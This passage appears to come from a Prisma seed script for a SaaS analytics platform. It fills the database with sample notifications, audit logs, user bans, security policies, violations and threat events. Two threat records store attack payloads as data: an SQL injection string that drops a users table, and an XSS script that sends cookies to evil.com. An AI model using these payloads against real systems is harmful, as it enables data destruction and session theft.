        featureAdoption: 0.88,
        supportTickets: 0,
        nps: 84
      },
      riskLevel: 'HEALTHY',
      churnProbability: 0.04,
      recommendations: ['Account growing steadily', 'Good candidate for reference customer'],
      calculatedAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
    }
  })

  // ==================== SYSTEM NOTIFICATIONS ====================
  console.log('📢 Creating system notifications...')

  await prisma.systemNotification.create({
    data: {
      title: 'Scheduled Maintenance',
      message: 'We will be performing scheduled maintenance on Saturday, January 18th from 2:00 AM to 4:00 AM UTC. During this time, the platform may experience brief interruptions.',
      type: 'MAINTENANCE',
      targetType: 'ALL',
      isActive: true,
      scheduledFor: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000),
      expiresAt: new Date(now.getTime() + 6 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemNotification.create({
    data: {
      title: 'New Feature: AI Insights V2',
      message: 'We\'re excited to announce AI Insights V2 with deeper analysis capabilities, trend predictions, and automated recommendations. Available now for Professional and Enterprise plans!',
      type: 'FEATURE',
      targetType: 'SPECIFIC_PLANS',
      targetPlans: ['PROFESSIONAL', 'ENTERPRISE'],
      isActive: true,
    }
  })

  await prisma.systemNotification.create({
    data: {
      title: 'API Deprecation Notice',
      message: 'The v1 API endpoints for audience creation will be deprecated on March 1st, 2025. Please migrate to the v2 API. See documentation for migration guide.',
      type: 'WARNING',
      targetType: 'ALL',
      isActive: true,
      expiresAt: new Date('2025-03-01'),
    }
  })

  await prisma.systemNotification.create({
    data: {
      title: 'Special Offer: Upgrade to Enterprise',
      message: 'For a limited time, get 20% off your first year of Enterprise plan. Contact sales to learn more.',
      type: 'PROMOTION',
      targetType: 'SPECIFIC_PLANS',
      targetPlans: ['STARTER', 'PROFESSIONAL'],
      isActive: true,
      expiresAt: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000),
    }
  })

  // Additional system notifications to reach 10
  await prisma.systemNotification.create({
    data: {
      title: 'New Feature: AI Insights V2 Now Available',
      message: 'We are excited to announce AI Insights V2 with improved accuracy and new recommendation capabilities. Enable it in your settings.',
      type: 'FEATURE',
      targetType: 'ALL',
      isActive: true,
      expiresAt: new Date(now.getTime() + 60 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemNotification.create({
    data: {
      title: 'Scheduled Database Maintenance',
      message: 'Database maintenance is scheduled for this Sunday 2AM-4AM UTC. Expect brief interruptions during this time.',
      type: 'MAINTENANCE',
      targetType: 'ALL',
      isActive: true,
      expiresAt: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemNotification.create({
    data: {
      title: 'Security Update: MFA Enforcement',
      message: 'Starting next month, MFA will be required for all admin accounts. Please ensure your MFA is configured.',
      type: 'WARNING',
      targetType: 'SPECIFIC_ROLES',
      targetRoles: ['ADMIN', 'OWNER'],
      isActive: true,
      expiresAt: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemNotification.create({
    data: {
      title: 'Webinar: Advanced Analytics Training',
      message: 'Join us for a live webinar on advanced analytics techniques. Register now to secure your spot.',
      type: 'INFO',
      targetType: 'ALL',
      isActive: true,
      actionUrl: 'https://gwi.com/webinars/advanced-analytics',
      actionText: 'Register Now',
      expiresAt: new Date(now.getTime() + 14 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemNotification.create({
    data: {
      title: 'Holiday Support Hours',
      message: 'Support hours will be limited during the holiday season. Emergency support remains available 24/7.',
      type: 'INFO',
      targetType: 'ALL',
      isActive: false,
      expiresAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
    }
  })

  await prisma.systemNotification.create({
    data: {
      title: 'Partner Program Launch',
      message: 'Introducing our new Partner Program with exclusive benefits. Apply today to become a certified partner.',
      type: 'FEATURE',
      targetType: 'SPECIFIC_PLANS',
      targetPlans: ['PROFESSIONAL', 'ENTERPRISE'],
      isActive: true,
      actionUrl: 'https://gwi.com/partners',
      actionText: 'Learn More',
      expiresAt: new Date(now.getTime() + 90 * 24 * 60 * 60 * 1000),
    }
  })

  // ==================== PLATFORM AUDIT LOGS ====================
  console.log('📝 Creating platform audit logs...')

  const superAdmin = await prisma.superAdmin.findFirst({ where: { email: 'superadmin@gwi.com' } })
  const platformAdmin = await prisma.superAdmin.findFirst({ where: { email: 'admin@gwi.com' } })

  if (superAdmin && platformAdmin) {
    await prisma.platformAuditLog.createMany({
      data: [
        {
          adminId: superAdmin.id,
          action: 'login',
          resourceType: 'super_admin',
          resourceId: superAdmin.id,
          details: { email: 'superadmin@gwi.com' },
          ipAddress: '192.168.1.100',
          userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
          timestamp: new Date(now.getTime() - 2 * 60 * 60 * 1000),
        },
        {
          adminId: platformAdmin.id,
          action: 'update_feature_flag',
          resourceType: 'feature_flag',
          resourceId: 'ai_insights_v2',
          details: { field: 'rolloutPercentage', oldValue: 50, newValue: 75 },
          ipAddress: '192.168.1.101',
          timestamp: new Date(now.getTime() - 4 * 60 * 60 * 1000),
        },
        {
          adminId: superAdmin.id,
          action: 'view_tenant',
          resourceType: 'organization',
          targetOrgId: acmeCorp.id,
          details: { reason: 'Support escalation review' },
          ipAddress: '192.168.1.100',
          timestamp: new Date(now.getTime() - 6 * 60 * 60 * 1000),
        },
        {
          adminId: platformAdmin.id,
          action: 'respond_ticket',
          resourceType: 'support_ticket',
          resourceId: ticket1.id,
          details: { ticketNumber: 'TKT-202501-00001' },
          ipAddress: '192.168.1.101',
          timestamp: new Date(now.getTime() - 8 * 60 * 60 * 1000),
        },
        {
          adminId: superAdmin.id,
          action: 'create_system_rule',
          resourceType: 'system_rule',
          details: { ruleName: 'API Rate Limiting' },
          ipAddress: '192.168.1.100',
          timestamp: new Date(now.getTime() - 24 * 60 * 60 * 1000),
        },
        {
          adminId: platformAdmin.id,
          action: 'calculate_health_score',
          resourceType: 'tenant_health',
          targetOrgId: techStartup.id,
          details: { score: 64, riskLevel: 'AT_RISK' },
          ipAddress: '192.168.1.101',
          timestamp: new Date(now.getTime() - 48 * 60 * 60 * 1000),
        },
        {
          action: 'login_failed',
          resourceType: 'super_admin',
          details: { email: 'unknown@hacker.com', reason: 'invalid_credentials' },
          ipAddress: '45.33.32.156',
          userAgent: 'curl/7.64.1',
          timestamp: new Date(now.getTime() - 72 * 60 * 60 * 1000),
        },
        {
          adminId: superAdmin.id,
          action: 'create_notification',
          resourceType: 'system_notification',
          details: { title: 'Scheduled Maintenance', type: 'MAINTENANCE' },
          ipAddress: '192.168.1.100',
          timestamp: new Date(now.getTime() - 96 * 60 * 60 * 1000),
        },
      ]
    })
  }

  // ==================== SYSTEM CONFIG ====================
  console.log('⚙️ Creating system configuration...')

  await prisma.systemConfig.createMany({
    data: [
      {
        key: 'platform.maintenance_mode',
        value: false,
        description: 'Enable maintenance mode to block all user access',
        // category: 'platform',
        isPublic: true,
      },
      {
        key: 'platform.signup_enabled',
        value: true,
        description: 'Allow new user registrations',
        // category: 'platform',
        isPublic: true,
      },
      {
        key: 'ai.default_model',
        value: 'claude-3-sonnet',
        description: 'Default AI model for agent operations',
        // category: 'ai',
        isPublic: false,
      },
      {
        key: 'ai.max_tokens_per_request',
        value: 4096,
        description: 'Maximum tokens per AI request',
        // category: 'ai',
        isPublic: false,
      },
      {
        key: 'billing.trial_days',
        value: 14,
        description: 'Number of days for free trial',
        // category: 'billing',
        isPublic: true,
      },
      {
        key: 'billing.grace_period_days',
        value: 7,
        description: 'Grace period after payment failure',
        // category: 'billing',
        isPublic: false,
      },
      {
        key: 'security.max_login_attempts',
        value: 5,
        description: 'Max failed login attempts before lockout',
        // category: 'security',
        isPublic: false,
      },
      {
        key: 'security.session_timeout_hours',
        value: 24,
        description: 'Session timeout in hours',
        // category: 'security',
        isPublic: false,
      },
    ]
  })

  // ==================== USER BANS ====================
  console.log('🚫 Creating user bans...')

  if (superAdmin && platformAdmin) {
    // Platform-wide permanent ban
    await prisma.userBan.create({
      data: {
        userId: bannedUser.id,
        orgId: null, // Platform-wide ban
        reason: 'Multiple violations of terms of service including sharing credentials and automated scraping.',
        bannedBy: superAdmin.id,
        banType: 'PERMANENT',
        expiresAt: null,
        appealStatus: 'REJECTED',
        appealNotes: 'Appeal denied on 2025-01-05. User showed no willingness to comply with ToS.',
        metadata: {
          previousWarnings: 3,
          incidentIds: ['INC-2024-001', 'INC-2024-012', 'INC-2025-003'],
          ipAddresses: ['45.33.32.156', '192.168.1.200']
        }
      }
    })

    // Temporary ban with pending appeal
    await prisma.userBan.create({
      data: {
        userId: suspiciousUser.id,
        orgId: null,
        reason: 'Suspicious activity detected - unusual API request patterns suggesting automated usage.',
        bannedBy: platformAdmin.id,
        banType: 'TEMPORARY',
        expiresAt: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000), // 7 days from now
        appealStatus: 'PENDING',
        appealNotes: 'User claims their API integration had a bug. Under review.',
        metadata: {
          createdAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000).toISOString(),
          requestsPerMinute: 500,
          normalRate: 50
        }
      }
    })

    // Shadow ban for spam behavior
    await prisma.userBan.create({
      data: {
        userId: inactiveUser.id,
        orgId: billingIssueOrg.id, // Org-specific ban
        reason: 'Account flagged for promotional spam in shared workspaces.',
        bannedBy: platformAdmin.id,
        banType: 'SHADOW',
        expiresAt: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000), // 30 days
        appealStatus: 'NONE',
        metadata: {
          spamCount: 15,
          affectedWorkspaces: ['marketing-insights', 'q4-planning']
        }
      }
    })
  }

  // ==================== ORGANIZATION SUSPENSIONS ====================
  console.log('⛔ Creating organization suspensions...')

  if (superAdmin && platformAdmin) {
    // Full suspension for ToS violation
    await prisma.organizationSuspension.create({
      data: {
        orgId: suspendedOrg.id,
        reason: 'Severe terms of service violation: Automated data harvesting detected across multiple endpoints.',
        suspendedBy: superAdmin.id,
        suspensionType: 'FULL',
        expiresAt: null, // Indefinite
        isActive: true,
        notes: 'Owner contacted via email on 2025-01-10. No response. Legal review pending.'
      }
    })

    // Billing hold suspension
    await prisma.organizationSuspension.create({
      data: {
        orgId: billingIssueOrg.id,
        reason: 'Failed payment after 3 retry attempts. Invoice #INV-2025-0042 overdue by 14 days.',
        suspendedBy: platformAdmin.id,
        suspensionType: 'BILLING_HOLD',
        expiresAt: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000), // Grace period
        isActive: true,
        notes: 'Customer support ticket TKT-202501-00010 opened. Awaiting updated payment method.'
      }
    })

    // Investigation suspension (not active - was resolved)
    await prisma.organizationSuspension.create({
      data: {
        orgId: techStartup.id,
        reason: 'Security incident reported - potential unauthorized access to admin credentials.',
        suspendedBy: superAdmin.id,
        suspensionType: 'INVESTIGATION',
        expiresAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000), // Expired 5 days ago
        isActive: false,
        notes: 'Investigation concluded: False alarm. User forgot their password and triggered security alerts. Suspension lifted on 2025-01-08.'
      }
    })

    // Add more audit logs for bans and suspensions
    await prisma.platformAuditLog.createMany({
      data: [
        {
          adminId: superAdmin.id,
          action: 'ban_user',
          resourceType: 'user',
          targetUserId: bannedUser.id,
          details: { banType: 'PERMANENT', reason: 'Multiple ToS violations' },
          ipAddress: '192.168.1.100',
          timestamp: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
        },
        {
          adminId: platformAdmin.id,
          action: 'ban_user',
          resourceType: 'user',
          targetUserId: suspiciousUser.id,
          details: { banType: 'TEMPORARY', reason: 'Suspicious activity' },
          ipAddress: '192.168.1.101',
          timestamp: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        },
        {
          adminId: superAdmin.id,
          action: 'suspend_org',
          resourceType: 'organization',
          targetOrgId: suspendedOrg.id,
          details: { suspensionType: 'FULL', reason: 'ToS violation' },
          ipAddress: '192.168.1.100',
          timestamp: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000),
        },
        {
          adminId: platformAdmin.id,
          action: 'suspend_org',
          resourceType: 'organization',
          targetOrgId: billingIssueOrg.id,
          details: { suspensionType: 'BILLING_HOLD', reason: 'Failed payment' },
          ipAddress: '192.168.1.101',
          timestamp: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
        },
        {
          adminId: superAdmin.id,
          action: 'lift_suspension',
          resourceType: 'organization',
          targetOrgId: techStartup.id,
          details: { previousType: 'INVESTIGATION', reason: 'Investigation completed - false alarm' },
          ipAddress: '192.168.1.100',
          timestamp: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
        },
        {
          adminId: platformAdmin.id,
          action: 'impersonate_user',
          resourceType: 'user',
          targetUserId: trialUser.id,
          details: { reason: 'Customer support - helping with onboarding' },
          ipAddress: '192.168.1.101',
          timestamp: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        },
      ]
    })
  }

  // ==================== ADDITIONAL TENANT HEALTH SCORES ====================
  console.log('💚 Creating additional tenant health scores...')

  await prisma.tenantHealthScore.create({
    data: {
      orgId: suspendedOrg.id,
      overallScore: 12,
      engagementScore: 5,
      usageScore: 19,
      healthIndicators: {
        dailyActiveUsers: 0,
        weeklyAgentRuns: 0,
        featureAdoption: 0.1,
        supportTickets: 5,
        nps: -50
      },
      riskLevel: 'CRITICAL',
      churnProbability: 0.95,
      recommendations: ['Account suspended - resolve ToS violation', 'Legal review required'],
    }
  })

  await prisma.tenantHealthScore.create({
    data: {
      orgId: billingIssueOrg.id,
      overallScore: 35,
      engagementScore: 28,
      usageScore: 42,
      healthIndicators: {
        dailyActiveUsers: 2,
        weeklyAgentRuns: 12,
        featureAdoption: 0.25,
        supportTickets: 2,
        nps: 20
      },
      riskLevel: 'CRITICAL',
      churnProbability: 0.72,
      recommendations: ['Resolve billing issue immediately', 'Offer payment plan option', 'Customer success outreach required'],
    }
  })

  await prisma.tenantHealthScore.create({
    data: {
      orgId: trialOrg.id,
      overallScore: 58,
      engagementScore: 65,
      usageScore: 51,
      healthIndicators: {
        dailyActiveUsers: 3,
        weeklyAgentRuns: 28,
        featureAdoption: 0.52,
        supportTickets: 1,
        nps: 55
      },
      riskLevel: 'AT_RISK',
      churnProbability: 0.45,
      recommendations: ['Trial ending soon - send conversion offer', 'Schedule demo of premium features', 'Assign customer success manager'],
    }
  })

  // ==================== ENTERPRISE PLATFORM DATA ====================
  // Wrapped in try-catch to handle cases where migration hasn't been applied yet
  // or there are schema mismatches between seed data and current schema
  try {
    // ==================== SECURITY POLICIES ====================
    console.log('🔒 Creating security policies...')

  const passwordPolicy = await prisma.securityPolicy.create({
    data: {
      name: 'Enterprise Password Policy',
      type: 'PASSWORD',
      description: 'Strong password requirements for all enterprise users',
      settings: {
        minLength: 12,
        requireUppercase: true,
        requireLowercase: true,
        requireNumbers: true,
        requireSpecialChars: true,
        maxAge: 90,
        preventReuse: 12,
        lockoutThreshold: 5,
        lockoutDuration: 30
      },
      isActive: true,
      scope: 'PLATFORM',
      priority: 100,
      enforcementMode: 'STRICT',
    }
  })

  const sessionPolicy = await prisma.securityPolicy.create({
    data: {
      name: 'Session Management Policy',
      type: 'SESSION',
      description: 'Controls session duration and idle timeout settings',
      settings: {
        maxSessionDuration: 24,
        idleTimeout: 60,
        singleSessionOnly: false,
        requireReauthForSensitive: true,
        sessionExtensionAllowed: true
      },
      isActive: true,
      scope: 'PLATFORM',
      priority: 90,
      enforcementMode: 'WARN',
    }
  })

  const mfaPolicy = await prisma.securityPolicy.create({
    data: {
      name: 'Multi-Factor Authentication Policy',
      type: 'MFA',
      description: 'MFA requirements for platform access',
      settings: {
        required: true,
        allowedMethods: ['totp', 'sms', 'email', 'webauthn'],
        gracePeriodDays: 7,
        rememberDeviceDays: 30,
        adminMfaRequired: true
      },
      isActive: true,
      scope: 'PLATFORM',
      priority: 95,
      enforcementMode: 'STRICT',
    }
  })

  const ipAllowlistPolicy = await prisma.securityPolicy.create({
    data: {
      name: 'IP Allowlist Policy',
      type: 'IP_ALLOWLIST',
      description: 'Restrict access to approved IP ranges',
      settings: {
        enabled: true,
        allowedRanges: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'],
        allowVPN: true,
        blockTor: true,
        geoRestrictions: ['CN', 'RU', 'KP']
      },
      isActive: true,
      scope: 'SPECIFIC_ORGS',
      targetOrgs: [enterpriseCo.id],
      priority: 80,
      enforcementMode: 'STRICT',
    }
  })

  const dataAccessPolicy = await prisma.securityPolicy.create({
    data: {
      name: 'Data Access Control Policy',
      type: 'DATA_ACCESS',
      description: 'Controls who can access sensitive data',
      settings: {
        classificationLevels: ['public', 'internal', 'confidential', 'restricted'],
        requireApprovalForRestricted: true,
        auditAllAccess: true,
        dataExportRestrictions: true,
        sensitiveFieldMasking: true
      },
      isActive: true,
      scope: 'PLATFORM',
      priority: 85,
      enforcementMode: 'WARN',
    }
  })

  const dlpPolicy = await prisma.securityPolicy.create({
    data: {
      name: 'Data Loss Prevention Policy',
      type: 'DLP',
      description: 'Prevents unauthorized data exfiltration',
      settings: {
        scanOutboundData: true,
        blockPII: true,
        blockCreditCards: true,
        blockSSN: true,
        alertOnSuspicious: true,
        maxExportRecords: 10000
      },
      isActive: true,
      scope: 'PLATFORM',
      priority: 88,
      enforcementMode: 'STRICT',
    }
  })

  const deviceTrustPolicy = await prisma.securityPolicy.create({
    data: {
      name: 'Device Trust Policy',
      type: 'DEVICE_TRUST',
      description: 'Requirements for trusted devices',
      settings: {
        requireDeviceRegistration: true,
        maxDevicesPerUser: 5,
        requireEncryption: true,
        requireScreenLock: true,
        minOSVersion: { windows: '10', macos: '12', ios: '15', android: '12' },
        blockJailbroken: true
      },
      isActive: true,
      scope: 'SPECIFIC_ORGS',
      targetOrgs: [enterpriseCo.id, acmeCorp.id],
      priority: 75,
      enforcementMode: 'WARN',
    }
  })

  const apiAccessPolicy = await prisma.securityPolicy.create({
    data: {
      name: 'API Access Security Policy',
      type: 'API_ACCESS',
      description: 'Security controls for API access',
      settings: {
        requireApiKey: true,
        keyRotationDays: 90,
        rateLimitPerMinute: 1000,
        requireHttps: true,
        allowedOrigins: ['*.gwi.com', '*.acme.com'],
        ipWhitelisting: false
      },
      isActive: true,
      scope: 'PLATFORM',
      priority: 70,
      enforcementMode: 'WARN',
    }
  })

  // Additional security policies to reach 10
  await prisma.securityPolicy.create({
    data: {
      name: 'Network Segmentation Policy',
      type: 'NETWORK',
      description: 'Controls for network segmentation and isolation',
      settings: {
        enableMicroSegmentation: true,
        isolateByTenant: true,
        allowCrossOrgTraffic: false,
        requireVPN: true,
        allowedCIDRs: ['10.0.0.0/8', '172.16.0.0/12']
      },
      isActive: true,
      scope: 'PLATFORM',
      priority: 65,
      enforcementMode: 'STRICT',
    }
  })

  await prisma.securityPolicy.create({
    data: {
      name: 'Audit Logging Policy',
      type: 'AUDIT',
      description: 'Requirements for audit logging and retention',
      settings: {
        logAllActions: true,
        retentionDays: 2555,
        includePayloads: true,
        realTimeAlerts: true,
        sensitiveFieldMasking: true,
        exportFormat: 'SIEM_COMPATIBLE'
      },
      isActive: true,
      scope: 'PLATFORM',
      priority: 60,
      enforcementMode: 'STRICT',
    }
  })

  // ==================== SECURITY VIOLATIONS ====================
  console.log('⚠️ Creating security violations...')

  await prisma.securityViolation.createMany({
    data: [
      {
        policyId: passwordPolicy.id,
        orgId: acmeCorp.id,
        userId: johnDoe.id,
        violationType: 'WEAK_PASSWORD',
        severity: 'WARNING',
        status: 'RESOLVED',
        description: 'User attempted to set password that did not meet complexity requirements',
        details: { attemptedPassword: '***masked***', failedRules: ['minLength', 'requireSpecialChars'] },
        createdAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        resolvedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 300000),
        resolution: 'User updated password to meet requirements',
      },
      {
        policyId: mfaPolicy.id,
        orgId: techStartup.id,
        userId: bobWilson.id,
        violationType: 'FAILED_MFA',
        severity: 'CRITICAL',
        status: 'OPEN',
        description: 'Multiple failed MFA attempts detected from unusual location',
        details: { attempts: 8, location: 'Unknown VPN', ipAddress: '185.220.101.42' },
        createdAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
      },
      {
        policyId: ipAllowlistPolicy.id,
        orgId: enterpriseCo.id,
        violationType: 'IP_BLOCKED',
        severity: 'CRITICAL',
        status: 'RESOLVED',
        description: 'Access attempt from blocked geographic region',
        details: { source: '223.5.5.5', country: 'CN', blockedBy: 'geoRestrictions' },
        createdAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        resolution: 'Access automatically blocked by policy',
      },
      {
        policyId: dlpPolicy.id,
        orgId: acmeCorp.id,
        userId: janeSmith.id,
        violationType: 'DATA_EXFILTRATION',
        severity: 'CRITICAL',
        status: 'ESCALATED',
        description: 'Attempted export of dataset containing PII exceeding threshold',
        details: { recordCount: 50000, piiFieldsDetected: ['email', 'phone', 'address'], exportType: 'CSV' },
        createdAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
      },
      {
        policyId: sessionPolicy.id,
        orgId: acmeCorp.id,
        userId: adminUser.id,
        violationType: 'SESSION_VIOLATION',
        severity: 'CRITICAL',
        status: 'RESOLVED',
        description: 'Session token used from different IP address than original',
        details: { originalIP: '192.168.1.100', newIP: '45.33.32.156', userAgent: 'curl/7.64.1' },
        createdAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
        resolvedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000 + 600000),
        resolution: 'Session terminated and user notified',
      },
      {
        policyId: deviceTrustPolicy.id,
        orgId: enterpriseCo.id,
        userId: sarahEnterprise.id,
        violationType: 'DEVICE_NOT_COMPLIANT',
        severity: 'WARNING',
        status: 'OPEN',
        description: 'Login attempt from unregistered device',
        details: { deviceType: 'Android', deviceId: 'unknown', osVersion: '11' },
        createdAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
      },
      {
        policyId: apiAccessPolicy.id,
        orgId: techStartup.id,
        violationType: 'RATE_LIMIT_EXCEEDED',
        severity: 'INFO',
        status: 'RESOLVED',
        description: 'API rate limit exceeded by 250%',
        details: { limit: 1000, actual: 2500, endpoint: '/api/v1/audiences', apiKeyPrefix: 'gwi_live_' },
        createdAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
        resolvedAt: new Date(now.getTime() - 6 * 60 * 60 * 1000 + 60000),
        resolution: 'Rate limit enforced, requests throttled',
      },
      {
        policyId: passwordPolicy.id,
        orgId: enterpriseCo.id,
        violationType: 'WEAK_PASSWORD',
        severity: 'WARNING',
        status: 'RESOLVED',
        description: 'User attempted to reuse a previous password',
        details: { passwordHistoryMatch: 3 },
        createdAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
        resolvedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 120000),
        resolution: 'User selected new unique password',
      },
      {
        policyId: dataAccessPolicy.id,
        orgId: acmeCorp.id,
        userId: johnDoe.id,
        violationType: 'UNAUTHORIZED_ACCESS',
        severity: 'CRITICAL',
        status: 'OPEN',
        description: 'Attempted access to restricted classification data without approval',
        details: { datasetId: 'ds_confidential_001', classification: 'restricted', requiredApproval: true },
        createdAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
      },
      {
        policyId: mfaPolicy.id,
        orgId: acmeCorp.id,
        userId: janeSmith.id,
        violationType: 'FAILED_MFA',
        severity: 'WARNING',
        status: 'RESOLVED',
        description: 'User attempted login without completing MFA enrollment during grace period',
        details: { gracePeriodExpired: true, enrollmentReminders: 3 },
        createdAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
        resolvedAt: new Date(now.getTime() - 13 * 24 * 60 * 60 * 1000),
        resolution: 'User completed MFA enrollment',
      },
      {
        policyId: sessionPolicy.id,
        orgId: techStartup.id,
        userId: bobWilson.id,
        violationType: 'SESSION_VIOLATION',
        severity: 'INFO',
        status: 'RESOLVED',
        description: 'User exceeded maximum concurrent sessions',
        details: { maxSessions: 3, activeSessions: 5, oldestSessionTerminated: true },
        createdAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
        resolvedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000 + 1000),
        resolution: 'Oldest sessions automatically terminated',
      },
      {
        policyId: dlpPolicy.id,
        orgId: enterpriseCo.id,
        userId: sarahEnterprise.id,
        violationType: 'DATA_EXFILTRATION',
        severity: 'CRITICAL',
        status: 'RESOLVED',
        description: 'Export blocked due to credit card numbers detected in dataset',
        details: { creditCardsFound: 145, exportBlocked: true, sanitizedExportOffered: true },
        createdAt: new Date(now.getTime() - 8 * 60 * 60 * 1000),
        resolution: 'Export blocked, user offered sanitized version',
      },
      {
        policyId: ipAllowlistPolicy.id,
        orgId: enterpriseCo.id,
        violationType: 'IP_BLOCKED',
        severity: 'CRITICAL',
        status: 'RESOLVED',
        description: 'Connection attempt from known Tor exit node',
        details: { source: '185.220.100.252', isTorExitNode: true },
        createdAt: new Date(now.getTime() - 18 * 60 * 60 * 1000),
        resolution: 'Connection automatically blocked',
      },
      {
        policyId: deviceTrustPolicy.id,
        orgId: acmeCorp.id,
        userId: adminUser.id,
        violationType: 'DEVICE_NOT_COMPLIANT',
        severity: 'CRITICAL',
        status: 'RESOLVED',
        description: 'Login attempt from jailbroken iOS device',
        details: { deviceType: 'iPhone', isJailbroken: true, detection: 'Cydia detected' },
        createdAt: new Date(now.getTime() - 20 * 60 * 60 * 1000),
        resolution: 'Access denied, user notified to use compliant device',
      },
      {
        policyId: apiAccessPolicy.id,
        orgId: acmeCorp.id,
        violationType: 'API_ABUSE',
        severity: 'WARNING',
        status: 'OPEN',
        description: 'Multiple requests with invalid or expired API key',
        details: { keyPrefix: 'gwi_test_old_', attempts: 50, timeWindow: '5 minutes' },
        createdAt: new Date(now.getTime() - 30 * 60 * 60 * 1000),
        resolution: 'Requests rejected, key owner notified',
      },
    ]
  })

  // ==================== THREAT EVENTS ====================
  console.log('🎯 Creating threat events...')

  await prisma.threatEvent.createMany({
    data: [
      {
        type: 'BRUTE_FORCE',
        severity: 'CRITICAL',
        status: 'MITIGATED',
        source: '45.33.32.156',
        description: 'Brute force attack detected against login endpoint',
        details: { attempts: 5000, uniqueUsernames: 150, timeWindow: '1 hour', blocked: true },
        createdAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        mitigatedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 300000),
        mitigation: 'IP blocked for 24 hours, affected accounts locked',
      },
      {
        type: 'PHISHING_ATTEMPT',
        severity: 'CRITICAL',
        status: 'OPEN',
        source: 'phishing_campaign',
        orgId: acmeCorp.id,
        description: 'Phishing campaign targeting organization users detected',
        details: { affectedUsers: 12, phishingDomain: 'gwi-login.fake.com', reportedBy: 'user' },
        createdAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
      },
      {
        type: 'SUSPICIOUS_ACTIVITY',
        severity: 'WARNING',
        status: 'CONTAINED',
        source: '103.21.244.0',
        orgId: techStartup.id,
        description: 'Unusual API access patterns detected',
        details: { pattern: 'sequential_enumeration', endpoints: ['/users', '/orgs', '/data'], requests: 10000 },
        createdAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
      },
      {
        type: 'CREDENTIAL_STUFFING',
        severity: 'CRITICAL',
        status: 'MITIGATED',
        source: '185.220.101.1',
        description: 'Credential stuffing attack using leaked credentials database',
        details: { totalAttempts: 25000, successfulLogins: 3, leakSource: 'unknown_breach' },
        createdAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
        mitigatedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000 + 1800000),
        mitigation: 'Compromised accounts locked, password reset required',
      },
      {
        type: 'SUSPICIOUS_ACTIVITY',
        severity: 'CRITICAL',
        status: 'RESOLVED',
        source: '198.51.100.42',
        description: 'SQL injection attempt in search query parameter',
        details: { payload: "'; DROP TABLE users; --", endpoint: '/api/search', blocked: true },
        createdAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
        mitigatedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000 + 100),
        mitigation: 'Request blocked by WAF, IP added to blocklist',
      },
      {
        type: 'SUSPICIOUS_ACTIVITY',
        severity: 'CRITICAL',
        status: 'RESOLVED',
        source: '203.0.113.50',
        description: 'Cross-site scripting attempt in user input field',
        details: { payload: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>', sanitized: true },
        createdAt: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000),
        mitigatedAt: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000 + 50),
        mitigation: 'Input sanitized, attempt logged',
      },
      {
        type: 'API_ABUSE',
        severity: 'WARNING',
        status: 'MITIGATED',
        source: '104.18.32.7',
        orgId: enterpriseCo.id,
        description: 'Automated data scraping detected via API',
        details: { requestsPerMinute: 500, dataExtracted: '50MB', duration: '2 hours' },
        createdAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000),
        mitigatedAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000 + 7200000),
        mitigation: 'Rate limiting applied, API key revoked',
      },
      {
        type: 'ACCOUNT_TAKEOVER',
        severity: 'CRITICAL',
        status: 'RESOLVED',
        source: 'suspicious_login',
        orgId: acmeCorp.id,
        userId: johnDoe.id,
        description: 'Successful account takeover detected and reversed',
        details: { loginLocation: 'Nigeria', normalLocation: 'United States', actionsPerformed: ['password_change', 'email_change'] },
        createdAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
        mitigatedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 3600000),
        mitigation: 'Account recovered, all sessions terminated, credentials reset',
      },
      {
